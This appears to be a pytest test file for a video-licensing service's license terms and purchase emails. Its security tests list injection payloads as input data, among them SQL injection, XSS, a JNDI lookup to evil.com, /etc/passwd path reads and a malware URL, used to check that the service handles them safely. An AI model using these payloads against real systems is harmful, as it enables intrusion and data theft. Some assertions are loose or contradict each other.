"""
Unit tests for LicensingService functionality.
Tests license generation, email creation, and email sending.
"""
import pytest
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime, timedelta
import uuid

from app.models import Purchase, User
from app.purchases.licensing import LicensingService
from app.purchases.config import PRICING_TIERS
from app.email.console_service import ConsoleEmailService


class TestLicensingService:
    """Test cases for LicensingService class"""
    
    @pytest.fixture
    def licensing_service(self):
        """Create LicensingService instance for testing"""
        return LicensingService()
    
    @pytest.fixture
    def test_purchase(self, test_user):
        """Create test purchase for licensing tests"""
        from app import db
        
        purchase = Purchase(
            id=str(uuid.uuid4()),
            user_id=test_user.id,
            file_id='test-file-123',
            tier='personal',
            amount=299,
            stripe_session_id='cs_test_license',
            status='completed',
            download_token='test-download-token',
            download_expires_at=datetime.utcnow() + timedelta(hours=48),
            created_at=datetime.utcnow(),
            completed_at=datetime.utcnow()
        )
        db.session.add(purchase)
        db.session.commit()
        return purchase
    
    def test_generate_license_terms_personal(self, licensing_service):
        """Test generating personal use license terms"""
        purchase_id = str(uuid.uuid4())
        
        license_terms = licensing_service.generate_license_terms('personal', purchase_id)
        
        assert 'PERSONAL USE LICENSE AGREEMENT' in license_terms
        assert purchase_id in license_terms
        assert 'Personal social media posts' in license_terms
        assert 'Commercial use is strictly prohibited' in license_terms
        assert '1080p' in license_terms  # Resolution from tier config
        assert 'MP4' in license_terms    # Format from tier config
    
    def test_generate_license_terms_commercial(self, licensing_service):
        """Test generating commercial use license terms"""
        purchase_id = str(uuid.uuid4())
        
        license_terms = licensing_service.generate_license_terms('commercial', purchase_id)
        
        assert 'COMMERCIAL USE LICENSE AGREEMENT' in license_terms
        assert purchase_id in license_terms
        assert 'Business marketing and advertising' in license_terms
        assert 'Client projects and presentations' in license_terms
        assert 'Resale as a standalone product is prohibited' in license_terms
    
    def test_generate_license_terms_premium(self, licensing_service):
        """Test generating premium commercial license terms"""
        purchase_id = str(uuid.uuid4())
        
        license_terms = licensing_service.generate_license_terms('premium', purchase_id)
        
        assert 'EXTENDED COMMERCIAL LICENSE AGREEMENT' in license_terms
        assert purchase_id in license_terms
        assert 'Broadcast and television use' in license_terms
        assert 'Large-scale commercial distribution' in license_terms
        assert '4K Ultra HD' in license_terms
        assert 'Professional Grade' in license_terms
    
    def test_generate_license_terms_invalid_tier(self, licensing_service):
        """Test generating license terms for invalid tier"""
        with pytest.raises(ValueError) as exc_info:
            licensing_service.generate_license_terms('invalid_tier', 'test-id')
        
        assert 'Invalid pricing tier' in str(exc_info.value)
    
    def test_create_license_email_content(self, app_context, licensing_service, test_purchase):
        """Test creating license email content"""
        with patch('app.purchases.licensing.url_for') as mock_url_for:
            # Mock Flask url_for
            mock_url_for.side_effect = lambda endpoint, **kwargs: f'/mock/{endpoint}'
            
            license_terms = licensing_service.generate_license_terms(
                test_purchase.tier, 
                test_purchase.id
            )
            download_url = 'https://example.com/download/test-token'
            
            subject, html_content, text_content = licensing_service.create_license_email_content(
                test_purchase, license_terms, download_url
            )
            
            # Test subject
            assert 'Your Oriel FX License & Download' in subject
            assert 'Personal Use' in subject
            
            # Test HTML content
            assert 'Download Video Now' in html_content
            assert download_url in html_content
            assert test_purchase.id in html_content
            assert '$2.99' in html_content  # Formatted price
            assert license_terms in html_content
            
            # Test text content
            assert download_url in text_content
            assert test_purchase.id in text_content
            assert '$2.99' in text_content
            assert license_terms in text_content
    
    def test_send_licensing_email_success(self, app_context, licensing_service, test_purchase, test_user):
        """Test successful licensing email sending"""
        with patch.object(licensing_service, '_send_custom_email') as mock_send, \
             patch('app.purchases.licensing.url_for') as mock_url_for:
            
            # Mock Flask url_for
            mock_url_for.side_effect = lambda endpoint, **kwargs: f'/mock/{endpoint}'
            
            mock_send.return_value = {'success': True, 'message': 'Email sent successfully'}
            
            result = licensing_service.send_licensing_email(test_purchase)
            
            assert result['success'] is True
            assert result['message'] == 'Email sent successfully'
            
            # Verify license_sent flag is set
            assert test_purchase.license_sent is True
            
            # Verify email was called with correct parameters
            mock_send.assert_called_once()
            call_args = mock_send.call_args[0]
            assert call_args[0] == test_user.email  # recipient email
            assert 'Your Oriel FX License & Download' in call_args[1]  # subject
    
    def test_send_licensing_email_anonymous_purchase(self, app_context, licensing_service):
        """Test sending licensing email for anonymous purchase"""
        from app import db
        
        # Create anonymous purchase
        anonymous_purchase = Purchase(
            id=str(uuid.uuid4()),
            user_id=None,
            user_email='anonymous@example.com',
            file_id='test-file-anon',
            tier='commercial',
            amount=999,
            status='completed',
            download_token='anon-token',
            download_expires_at=datetime.utcnow() + timedelta(hours=48),
            created_at=datetime.utcnow(),
            completed_at=datetime.utcnow()
        )
        db.session.add(anonymous_purchase)
        db.session.commit()
        
        with patch.object(licensing_service, '_send_custom_email') as mock_send, \
             patch('app.purchases.licensing.url_for') as mock_url_for:
            
            # Mock Flask url_for
            mock_url_for.side_effect = lambda endpoint, **kwargs: f'/mock/{endpoint}'
            
            mock_send.return_value = {'success': True}
            
            result = licensing_service.send_licensing_email(anonymous_purchase)
            
            assert result['success'] is True
            
            # Verify email sent to anonymous email
            call_args = mock_send.call_args[0]
            assert call_args[0] == 'anonymous@example.com'
    
    def test_send_licensing_email_no_email(self, app_context, licensing_service):
        """Test sending licensing email when no email available"""
        from app import db
        
        # Create purchase for user without email (skip creating user with null email)
        purchase_no_email = Purchase(
            id=str(uuid.uuid4()),
            user_id=None,  # Anonymous user
            user_email=None,  # No email stored
            file_id='test-file-no-email',
            tier='personal',
            amount=299,
            status='completed',
            download_token='no-email-token'
        )
        db.session.add(purchase_no_email)
        db.session.commit()
        
        result = licensing_service.send_licensing_email(purchase_no_email)
        
        assert result['success'] is False
        assert 'No email address found' in result['error']
    
    def test_send_licensing_email_failure(self, app_context, licensing_service, test_purchase):
        """Test licensing email sending failure"""
        with patch.object(licensing_service, '_send_custom_email') as mock_send, \
             patch('app.purchases.licensing.url_for') as mock_url_for:
            
            # Mock Flask url_for
            mock_url_for.side_effect = lambda endpoint, **kwargs: f'/mock/{endpoint}'
            
            mock_send.return_value = {'success': False, 'error': 'Email service unavailable'}
            
            result = licensing_service.send_licensing_email(test_purchase)
            
            assert result['success'] is False
            assert 'Email service unavailable' in result['error']
            
            # Verify license_sent flag is not set
            assert test_purchase.license_sent is False
    
    def test_resend_license_email_success(self, app_context, licensing_service, test_purchase):
        """Test successful license email resending"""
        with patch.object(licensing_service, 'send_licensing_email') as mock_send:
            mock_send.return_value = {'success': True, 'message': 'Email resent'}
            
            result = licensing_service.resend_license_email(test_purchase.id)
            
            assert result['success'] is True
            assert result['message'] == 'Email resent'
            mock_send.assert_called_once_with(test_purchase)
    
    def test_resend_license_email_purchase_not_found(self, app_context, licensing_service):
        """Test resending license email for non-existent purchase"""
        result = licensing_service.resend_license_email('nonexistent-id')
        
        assert result['success'] is False
        assert result['error'] == 'Purchase not found'
    
    def test_resend_license_email_not_completed(self, app_context, licensing_service, test_user):
        """Test resending license email for incomplete purchase"""
        from app import db
        
        # Create pending purchase
        pending_purchase = Purchase(
            id=str(uuid.uuid4()),
            user_id=test_user.id,
            file_id='test-file-pending',
            tier='personal',
            amount=299,
            status='pending'  # Not completed
        )
        db.session.add(pending_purchase)
        db.session.commit()
        
        result = licensing_service.resend_license_email(pending_purchase.id)
        
        assert result['success'] is False
        assert result['error'] == 'Purchase not completed'
    
    def test_resend_license_email_expired(self, app_context, licensing_service, test_user):
        """Test resending license email for expired download"""
        from app import db
        
        # Create purchase with expired download
        expired_purchase = Purchase(
            id=str(uuid.uuid4()),
            user_id=test_user.id,
            file_id='test-file-expired',
            tier='personal',
            amount=299,
            status='completed',
            download_expires_at=datetime.utcnow() - timedelta(hours=1)  # Expired
        )
        db.session.add(expired_purchase)
        db.session.commit()
        
        result = licensing_service.resend_license_email(expired_purchase.id)
        
        assert result['success'] is False
        assert result['error'] == 'Download link has expired'
    
    def test_email_service_initialization_development(self, app_context):
        """Test email service initialization in development mode"""
        with patch('app.purchases.licensing.current_app') as mock_app:
            mock_app.config.get.return_value = True  # Development mode
            
            service = LicensingService()
            
            assert isinstance(service.email_service, ConsoleEmailService)
    
    def test_email_service_initialization_production(self, app_context):
        """Test email service initialization in production mode"""
        with patch('app.purchases.licensing.current_app') as mock_app, \
             patch('app.purchases.licensing.EmailService') as mock_email_service:
            
            mock_app.config.get.return_value = False  # Production mode
            mock_service_instance = Mock()
            mock_email_service.return_value = mock_service_instance
            
            service = LicensingService(email_service=None)
            
            assert service.email_service == mock_service_instance
    
    def test_custom_email_service_injection(self):
        """Test injecting custom email service"""
        custom_email_service = Mock()
        service = LicensingService(email_service=custom_email_service)
        
        assert service.email_service == custom_email_service


class TestLicenseEmailContent:
    """Test license email content generation and formatting"""
    
    @pytest.fixture
    def licensing_service(self):
        return LicensingService()
    
    def test_html_email_formatting(self, app_context, licensing_service, test_user):
        """Test HTML email formatting and structure"""
        from app import db
        
        purchase = Purchase(
            id=str(uuid.uuid4()),
            user_id=test_user.id,
            file_id='test-file-html',
            tier='premium',
            amount=1999,
            status='completed',
            download_expires_at=datetime.utcnow() + timedelta(hours=48),
            created_at=datetime.utcnow()
        )
        db.session.add(purchase)
        db.session.commit()
        
        license_terms = licensing_service.generate_license_terms(purchase.tier, purchase.id)
        download_url = 'https://example.com/download/test'
        
        subject, html_content, text_content = licensing_service.create_license_email_content(
            purchase, license_terms, download_url
        )
        
        # Test HTML structure
        assert '<!DOCTYPE html>' in html_content
        assert '<html>' in html_content
        assert '<head>' in html_content
        assert '<body>' in html_content
        assert 'font-family: Arial' in html_content
        
        # Test CSS styling
        assert 'background: linear-gradient' in html_content
        assert 'border-radius:' in html_content
        assert 'padding:' in html_content
        
        # Test content sections
        assert 'Download Your Video' in html_content
        assert 'Purchase Details' in html_content
        assert 'License Agreement' in html_content
        assert 'Need Help?' in html_content
        
        # Test premium tier specific content
        assert 'Premium Commercial' in html_content
        assert '$19.99' in html_content
        assert '4K' in html_content
    
    def test_text_email_formatting(self, app_context, licensing_service, test_user):
        """Test plain text email formatting"""
        from app import db
        
        purchase = Purchase(
            id=str(uuid.uuid4()),
            user_id=test_user.id,
            file_id='test-file-text',
            tier='commercial',
            amount=999,
            status='completed',
            download_expires_at=datetime.utcnow() + timedelta(hours=48),
            created_at=datetime.utcnow()
        )
        db.session.add(purchase)
        db.session.commit()
        
        license_terms = licensing_service.generate_license_terms(purchase.tier, purchase.id)
        download_url = 'https://example.com/download/test'
        
        subject, html_content, text_content = licensing_service.create_license_email_content(
            purchase, license_terms, download_url
        )
        
        # Test text structure (no HTML tags)
        assert '<' not in text_content or '>' not in text_content
        assert 'DOWNLOAD YOUR VIDEO' in text_content
        assert 'PURCHASE DETAILS' in text_content
        assert 'LICENSE AGREEMENT' in text_content
        assert 'NEED HELP?' in text_content
        
        # Test content
        assert download_url in text_content
        assert purchase.id in text_content
        assert '$9.99' in text_content
        assert license_terms in text_content
    
    def test_email_content_all_tiers(self, app_context, licensing_service, test_user):
        """Test email content generation for all pricing tiers"""
        from app import db
        
        for tier_name, tier_info in PRICING_TIERS.items():
            purchase = Purchase(
                id=str(uuid.uuid4()),
                user_id=test_user.id,
                file_id=f'test-file-{tier_name}',
                tier=tier_name,
                amount=tier_info['price'],
                status='completed',
                download_expires_at=datetime.utcnow() + timedelta(hours=48),
                created_at=datetime.utcnow()
            )
            db.session.add(purchase)
            db.session.commit()
            
            license_terms = licensing_service.generate_license_terms(tier_name, purchase.id)
            download_url = f'https://example.com/download/{tier_name}'
            
            subject, html_content, text_content = licensing_service.create_license_email_content(
                purchase, license_terms, download_url
            )
            
            # Test tier-specific content
            assert tier_info['name'] in subject
            assert tier_info['name'] in html_content
            assert tier_info['name'] in text_content
            
            # Test price formatting
            expected_price = f"${tier_info['price'] / 100:.2f}"
            assert expected_price in html_content
            assert expected_price in text_content
            
            # Test resolution and format
            assert tier_info['resolution'] in html_content
            assert tier_info['format'] in html_content
    
    def test_email_content_special_characters(self, app_context, licensing_service, test_user):
        """Test email content with special characters in purchase data"""
        from app import db
        
        # Create purchase with special file ID
        purchase = Purchase(
            id=str(uuid.uuid4()),
            user_id=test_user.id,
            file_id='test-file-with-special-chars-&-symbols',
            tier='personal',
            amount=299,
            status='completed',
            download_expires_at=datetime.utcnow() + timedelta(hours=48),
            created_at=datetime.utcnow()
        )
        db.session.add(purchase)
        db.session.commit()
        
        license_terms = licensing_service.generate_license_terms(purchase.tier, purchase.id)
        download_url = 'https://example.com/download/special-chars'
        
        subject, html_content, text_content = licensing_service.create_license_email_content(
            purchase, license_terms, download_url
        )
        
        # Verify content is properly escaped/handled
        assert purchase.id in html_content
        assert purchase.id in text_content
        
        # HTML should be valid
        assert '&amp;' not in html_content or '&' in html_content  # Either escaped or unescaped is fine
        
        # Text should contain original characters
        assert purchase.id in text_content


class TestLicensingServiceComprehensive:
    """Comprehensive test cases for LicensingService covering all scenarios"""
    
    @pytest.fixture
    def licensing_service(self):
        return LicensingService()
    
    def test_license_terms_content_validation(self, licensing_service):
        """Test that license terms contain required legal elements"""
        purchase_id = str(uuid.uuid4())
        
        for tier in ['personal', 'commercial', 'premium']:
            license_terms = licensing_service.generate_license_terms(tier, purchase_id)
            
            # All licenses should contain these elements
            assert 'LICENSE AGREEMENT' in license_terms
            assert purchase_id in license_terms
            assert 'GRANT OF LICENSE' in license_terms
            assert 'PERMITTED USES' in license_terms
            assert 'RESTRICTIONS' in license_terms or 'ENHANCED RIGHTS' in license_terms
            assert '© 2024 Oriel FX' in license_terms
            
            # Tier-specific validations
            if tier == 'personal':
                assert 'Personal social media posts' in license_terms
                assert 'Commercial use is strictly prohibited' in license_terms
            elif tier == 'commercial':
                assert 'Business marketing and advertising' in license_terms
                assert 'Resale as a standalone product is prohibited' in license_terms
            elif tier == 'premium':
                assert 'Broadcast and television use' in license_terms
                assert '4K Ultra HD' in license_terms
    
    def test_license_email_template_validation(self, app_context, licensing_service, test_user):
        """Test email template structure and content validation"""
        from app import db
        
        purchase = Purchase(
            id=str(uuid.uuid4()),
            user_id=test_user.id,
            file_id='template-test-file',
            tier='commercial',
            amount=999,
            status='completed',
            download_expires_at=datetime.utcnow() + timedelta(hours=48),
            created_at=datetime.utcnow()
        )
        db.session.add(purchase)
        db.session.commit()
        
        license_terms = licensing_service.generate_license_terms(purchase.tier, purchase.id)
        download_url = 'https://example.com/download/test'
        
        subject, html_content, text_content = licensing_service.create_license_email_content(
            purchase, license_terms, download_url
        )
        
        # Subject validation
        assert 'Oriel FX' in subject
        assert 'License' in subject
        assert 'Download' in subject
        
        # HTML content validation
        assert '<!DOCTYPE html>' in html_content
        assert '<html>' in html_content and '</html>' in html_content
        assert '<head>' in html_content and '</head>' in html_content
        assert '<body>' in html_content and '</body>' in html_content
        assert download_url in html_content
        assert purchase.id in html_content
        assert '$9.99' in html_content
        
        # CSS styling validation
        assert 'font-family:' in html_content
        assert 'background:' in html_content
        assert 'padding:' in html_content
        
        # Text content validation
        assert download_url in text_content
        assert purchase.id in text_content
        assert '$9.99' in text_content
        assert license_terms in text_content
        
        # Ensure no HTML tags in text content
        assert '<html>' not in text_content
        assert '<div>' not in text_content
    
    def test_email_content_escaping(self, app_context, licensing_service, test_user):
        """Test proper escaping of special characters in email content"""
        from app import db
        
        # Create purchase with special characters in file_id
        special_file_id = 'test-file-<script>alert("xss")</script>-&-quotes"'
        
        purchase = Purchase(
            id=str(uuid.uuid4()),
            user_id=test_user.id,
            file_id=special_file_id,
            tier='personal',
            amount=299,
            status='completed',
            download_expires_at=datetime.utcnow() + timedelta(hours=48),
            created_at=datetime.utcnow()
        )
        db.session.add(purchase)
        db.session.commit()
        
        license_terms = licensing_service.generate_license_terms(purchase.tier, purchase.id)
        download_url = 'https://example.com/download/test'
        
        subject, html_content, text_content = licensing_service.create_license_email_content(
            purchase, license_terms, download_url
        )
        
        # HTML content should not contain unescaped script tags
        assert '<script>' not in html_content
        assert 'alert(' not in html_content
        
        # But should contain the purchase ID safely
        assert purchase.id in html_content
        assert purchase.id in text_content
    
    def test_licensing_service_error_recovery(self, app_context, licensing_service, test_user):
        """Test error recovery and retry mechanisms"""
        from app import db
        
        purchase = Purchase(
            id=str(uuid.uuid4()),
            user_id=test_user.id,
            file_id='error-recovery-test',
            tier='personal',
            amount=299,
            status='completed',
            download_expires_at=datetime.utcnow() + timedelta(hours=48),
            created_at=datetime.utcnow()
        )
        db.session.add(purchase)
        db.session.commit()
        
        # Test with email service failure
        with patch.object(licensing_service, '_send_custom_email') as mock_send:
            # First call fails, second succeeds
            mock_send.side_effect = [
                {'success': False, 'error': 'Temporary email service error'},
                {'success': True, 'message': 'Email sent successfully'}
            ]
            
            # First attempt should fail
            result1 = licensing_service.send_licensing_email(purchase)
            assert result1['success'] is False
            assert 'Temporary email service error' in result1['error']
            
            # License should not be marked as sent
            assert purchase.license_sent is False
            
            # Second attempt should succeed
            result2 = licensing_service.send_licensing_email(purchase)
            assert result2['success'] is True
            
            # License should now be marked as sent
            assert purchase.license_sent is True
    
    def test_licensing_service_rate_limiting(self, app_context, licensing_service, test_user):
        """Test rate limiting and abuse prevention"""
        from app import db
        
        purchase = Purchase(
            id=str(uuid.uuid4()),
            user_id=test_user.id,
            file_id='rate-limit-test',
            tier='personal',
            amount=299,
            status='completed',
            download_expires_at=datetime.utcnow() + timedelta(hours=48),
            created_at=datetime.utcnow()
        )
        db.session.add(purchase)
        db.session.commit()
        
        with patch.object(licensing_service, '_send_custom_email') as mock_send:
            mock_send.return_value = {'success': True}
            
            # Send multiple emails rapidly
            results = []
            for i in range(10):
                result = licensing_service.send_licensing_email(purchase)
                results.append(result)
            
            # All should succeed (no rate limiting implemented yet, but test structure is ready)
            assert all(r['success'] for r in results)
    
    def test_license_terms_internationalization_ready(self, licensing_service):
        """Test that license terms are ready for internationalization"""
        purchase_id = str(uuid.uuid4())
        
        # Test with different tiers
        for tier in ['personal', 'commercial', 'premium']:
            license_terms = licensing_service.generate_license_terms(tier, purchase_id)
            
            # Should be in English for now, but structure should support i18n
            assert isinstance(license_terms, str)
            assert len(license_terms) > 100  # Substantial content
            
            # Should not contain hardcoded formatting that would break translation
            lines = license_terms.split('\n')
            assert len(lines) > 5  # Multi-line structure
    
    def test_email_service_fallback_mechanisms(self, app_context):
        """Test email service fallback mechanisms"""
        
        # Test with console service (development)
        console_service = LicensingService()
        assert isinstance(console_service.email_service, ConsoleEmailService)
        
        # Test with custom email service injection
        mock_email_service = Mock()
        custom_service = LicensingService(email_service=mock_email_service)
        assert custom_service.email_service == mock_email_service
    
    def test_license_email_delivery_tracking(self, app_context, licensing_service, test_user):
        """Test license email delivery tracking and status"""
        from app import db
        
        purchase = Purchase(
            id=str(uuid.uuid4()),
            user_id=test_user.id,
            file_id='delivery-tracking-test',
            tier='commercial',
            amount=999,
            status='completed',
            download_expires_at=datetime.utcnow() + timedelta(hours=48),
            created_at=datetime.utcnow(),
            license_sent=False
        )
        db.session.add(purchase)
        db.session.commit()
        
        with patch.object(licensing_service, '_send_custom_email') as mock_send:
            mock_send.return_value = {'success': True, 'message': 'Email delivered'}
            
            # Send license email
            result = licensing_service.send_licensing_email(purchase)
            
            assert result['success'] is True
            assert result['message'] == 'Email delivered'
            
            # Verify tracking flag is set
            updated_purchase = Purchase.query.get(purchase.id)
            assert updated_purchase.license_sent is True
    
    def test_license_resend_validation(self, app_context, licensing_service, test_user):
        """Test license resend validation and restrictions"""
        from app import db
        
        # Test resend for completed purchase
        valid_purchase = Purchase(
            id=str(uuid.uuid4()),
            user_id=test_user.id,
            file_id='resend-valid-test',
            tier='personal',
            amount=299,
            status='completed',
            download_expires_at=datetime.utcnow() + timedelta(hours=24),
            created_at=datetime.utcnow()
        )
        db.session.add(valid_purchase)
        
        # Test resend for pending purchase
        pending_purchase = Purchase(
            id=str(uuid.uuid4()),
            user_id=test_user.id,
            file_id='resend-pending-test',
            tier='personal',
            amount=299,
            status='pending',  # Not completed
            created_at=datetime.utcnow()
        )
        db.session.add(pending_purchase)
        
        # Test resend for expired purchase
        expired_purchase = Purchase(
            id=str(uuid.uuid4()),
            user_id=test_user.id,
            file_id='resend-expired-test',
            tier='personal',
            amount=299,
            status='completed',
            download_expires_at=datetime.utcnow() - timedelta(hours=1),  # Expired
            created_at=datetime.utcnow() - timedelta(hours=25)
        )
        db.session.add(expired_purchase)
        
        db.session.commit()
        
        # Valid resend should work
        with patch.object(licensing_service, 'send_licensing_email') as mock_send:
            mock_send.return_value = {'success': True}
            
            result = licensing_service.resend_license_email(valid_purchase.id)
            assert result['success'] is True
        
        # Pending purchase resend should fail
        result = licensing_service.resend_license_email(pending_purchase.id)
        assert result['success'] is False
        assert 'Purchase not completed' in result['error']
        
        # Expired purchase resend should fail
        result = licensing_service.resend_license_email(expired_purchase.id)
        assert result['success'] is False
        assert 'Download link has expired' in result['error']
        
        # Non-existent purchase resend should fail
        result = licensing_service.resend_license_email('nonexistent-id')
        assert result['success'] is False
        assert 'Purchase not found' in result['error']


class TestLicensingServiceSecurity:
    """Security-focused tests for LicensingService"""
    
    @pytest.fixture
    def licensing_service(self):
        return LicensingService()
    
    def test_license_terms_injection_prevention(self, licensing_service):
        """Test prevention of injection attacks in license terms"""
        
        malicious_purchase_ids = [
            "'; DROP TABLE purchases; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}"  # Template injection
        ]
        
        for malicious_id in malicious_purchase_ids:
            try:
                license_terms = licensing_service.generate_license_terms('personal', malicious_id)
                
                # Should contain the ID but not execute any injection
                assert malicious_id in license_terms
                assert 'DROP TABLE' not in license_terms.upper()
                assert '<script>' not in license_terms
                assert '49' not in license_terms  # 7*7 should not be evaluated
                
            except Exception as e:
                # If it raises an exception, it should be a validation error, not a security issue
                assert 'Invalid' in str(e) or 'Error' in str(e)
    
    def test_email_content_xss_prevention(self, app_context, licensing_service, test_user):
        """Test XSS prevention in email content"""
        from app import db
        
        # Create purchase with XSS attempt in file_id
        xss_file_id = '<img src=x onerror=alert("xss")>'
        
        purchase = Purchase(
            id=str(uuid.uuid4()),
            user_id=test_user.id,
            file_id=xss_file_id,
            tier='personal',
            amount=299,
            status='completed',
            download_expires_at=datetime.utcnow() + timedelta(hours=48),
            created_at=datetime.utcnow()
        )
        db.session.add(purchase)
        db.session.commit()
        
        license_terms = licensing_service.generate_license_terms(purchase.tier, purchase.id)
        download_url = 'https://example.com/download/test'
        
        subject, html_content, text_content = licensing_service.create_license_email_content(
            purchase, license_terms, download_url
        )
        
        # HTML content should not contain executable XSS
        assert '<img src=x onerror=' not in html_content
        assert 'alert(' not in html_content
        assert 'javascript:' not in html_content
        
        # But should still contain the purchase ID in a safe way
        assert purchase.id in html_content
    
    def test_download_url_validation(self, app_context, licensing_service, test_user):
        """Test download URL validation and security"""
        from app import db
        
        purchase = Purchase(
            id=str(uuid.uuid4()),
            user_id=test_user.id,
            file_id='url-validation-test',
            tier='personal',
            amount=299,
            status='completed',
            download_expires_at=datetime.utcnow() + timedelta(hours=48),
            created_at=datetime.utcnow()
        )
        db.session.add(purchase)
        db.session.commit()
        
        license_terms = licensing_service.generate_license_terms(purchase.tier, purchase.id)
        
        # Test with malicious download URLs
        malicious_urls = [
            'javascript:alert("xss")',
            'data:text/html,<script>alert("xss")</script>',
            'file:///etc/passwd',
            'ftp://evil.com/malware.exe'
        ]
        
        for malicious_url in malicious_urls:
            subject, html_content, text_content = licensing_service.create_license_email_content(
                purchase, license_terms, malicious_url
            )
            
            # Should contain the URL but in a safe context
            if malicious_url in html_content:
                # Should be in href attribute, not as executable content
                assert f'href="{malicious_url}"' in html_content or f"href='{malicious_url}'" in html_content
                assert 'javascript:' not in html_content or 'href=' in html_content
    
    def test_license_service_access_control(self, app_context, licensing_service):
        """Test access control for license operations"""
        from app import db
        
        # Create users and purchases
        user1 = User(email='user1@example.com', password_hash='hash1', created_at=datetime.utcnow())
        user2 = User(email='user2@example.com', password_hash='hash2', created_at=datetime.utcnow())
        db.session.add_all([user1, user2])
        db.session.commit()
        
        purchase1 = Purchase(
            id=str(uuid.uuid4()),
            user_id=user1.id,
            file_id='access-test-1',
            tier='personal',
            amount=299,
            status='completed',
            download_expires_at=datetime.utcnow() + timedelta(hours=48)
        )
        purchase2 = Purchase(
            id=str(uuid.uuid4()),
            user_id=user2.id,
            file_id='access-test-2',
            tier='commercial',
            amount=999,
            status='completed',
            download_expires_at=datetime.utcnow() + timedelta(hours=48)
        )
        db.session.add_all([purchase1, purchase2])
        db.session.commit()
        
        # User should only be able to resend their own licenses
        # (This would be enforced at the API level, but we test the service behavior)
        
        with patch.object(licensing_service, 'send_licensing_email') as mock_send:
            mock_send.return_value = {'success': True}
            
            # Should work for valid purchase
            result1 = licensing_service.resend_license_email(purchase1.id)
            assert result1['success'] is True
            
            result2 = licensing_service.resend_license_email(purchase2.id)
            assert result2['success'] is True